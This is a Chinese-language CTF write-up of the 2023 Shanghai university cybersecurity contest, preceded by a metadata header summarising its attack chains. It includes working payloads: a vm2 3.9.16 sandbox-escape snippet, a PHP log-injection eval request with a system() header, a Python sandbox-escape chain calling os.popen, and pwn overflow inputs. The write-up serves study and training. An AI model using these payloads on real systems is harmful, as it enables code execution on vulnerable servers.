---
title: 2023 年第八届上海市大学生网络安全大赛 Writeup
contest: 上海大学生网安大赛 2023
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [Cookie窃取, express_session_secret, vm2_3.9.16_sandbox_escape, Spring_原生反序列化, AliyunCTF_2023, easy_log_PHP_RCE, PWN整数溢出, KeyBox堆重叠, ssql菜单]
attack_chain:
  - CookieBack: 注释提示 send cookie to /cookie?data endpoint
  - /cookie?data=connect.sid=... 自取 cookie 再访问
  - easy_node: vm2 3.9.16 sandbox escape (Snyk SNYK-JS-VM2-5537100)
  - length 属性覆盖绕黑名单
  - Error.toString Proxy + apply 拿到 process
  - fun_java: SpringBoot 原生反序列化 (AliyunCTF 2023 bypassit1)
  - Jackson POJONode + BadAttributeValueExpException + TemplatesImpl
  - easy_log: username[]=PHP 代码 注入 + 无参数 RCE
  - getallheaders()['Tao'] = system('cat /S3cret_1S_H3re')
  - ezpython: Python 沙箱逃逸 + __builtins__['eval']
  - PWN KeyBox: 整数溢出 -2^63+0xc 绕 key 验证
  - 堆重叠 + 改 v9 指针为后门函数
  - ssql: 模拟 MySQL 数据库 + off-by-one + 0x291 fake size
key_payload: 'vm2 沙箱逃逸: err.name = {toString: new Proxy(() => "", {apply(target, thiz, args) {...}})}'
one_liner: 上海大学生 8 题：cookie 窃取+vm2 sandbox+Spring 反序列化+无参数 RCE+Python 沙箱+KeyBox 整数溢出。
lesson: vm2 3.9.16 用 Error+Proxy+apply 绕过；Spring Boot 原生反序列化走 AliyunCTF bypassit1 路线；无参数 RCE 用 getallheaders()。
quality: high
---

# 2023 年第八届上海市大学生网络安全大赛 Writeup

## 来源
- 原文：ctfiot.com/117690.html
- 时间：2023.5.20 By ACT

## 8+ 道题详解

### Web
1. **CookieBack**（cookie 窃取）
   - 注释：`<!-- What? Is your cookie data? Send the data to the cookie. -->`
   - 扫描目录发现 /cookie endpoint
   - /cookie?data=connect.sid=... 自取 cookie 再访问

2. **easy_node**（vm2 3.9.16 sandbox escape）
   ```js
   {
     "name": ["vm2_tester"],
     "properties": {"length": "vm2_tester"}
   }
   ```
   - 覆盖 `length` 属性绕过黑名单
   - 触发 vm2 3.9.16 sandbox escape (CVE-2023-37466 / SNYK-JS-VM2-5537100)
   ```js
   const err = new Error();
   err.name = {toString: new Proxy(() => "", {apply(target, thiz, args) {
     const process = args.constructor.constructor("return process")();
     throw process.mainModule.require("child_process").execSync("cat /flag").toString();
   }})};
   try { err.stack; } catch(stdout) { stdout; }
   ```

3. **fun_java**（Spring Boot 原生反序列化）
   - 参考 AliyunCTF 2023 bypassit1
   - Jackson POJONode + BadAttributeValueExpException + TemplatesImpl
   - 字节码 javassist 构造 AbstractTranslet 子类
   - Runtime.exec 反弹 shell

4. **easy_log**（PHP 无参数 RCE）
   ```php
   username[<?php eval(end(getallheaders()));?>][]=1&password=5555
   ```
   - key 不编码，value 编码
   - log 文件写入 PHP 代码
   - 访问 log 文件 + 头 `Tao: system('cat /S3cret_1S_H3re');` RCE

5. **ezpython**（Python 沙箱逃逸）
   ```python
   ''.__class__.__base__.__subclasses__()[124].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("find / -name flag*").read()')
   ```

### PWN
6. **KeyBox**（整数溢出 + 堆重叠）
   - key 验证：rax*8 整数溢出 = 0x60
   - `p.sendlineafter("Input the first key: ", str((-2**63) + 0xc))`
   - 堆布局泄露 heap
   - 改 v9 指针为后门函数 0x401765

7. **SSQL**（模拟 MySQL + off-by-one）
   - 0x291 fake chunk size
   - 堆块重叠触发 _IO_FILE 攻击

## 关键技巧
- **vm2 sandbox escape**：Error+Proxy+apply 拿 process
- **Spring Boot 反序列化**：AliyunCTF bypassit1 路线
- **PHP 无参数 RCE**：getallheaders() 拿最后一个头
- **Python 沙箱逃逸**：__builtins__['eval'] 走 __subclasses__
- **整数溢出**：rax = 0x800000000000000c + 0xc = 0x60
- **堆重叠**：改 chunk size + fake v9 指针

## 适用场景
- express_session_secret 攻击
- vm2 3.9.16 sandbox bypass
- Spring 原生反序列化
- PHP 无参数 RCE
- 整数溢出 + 堆管理
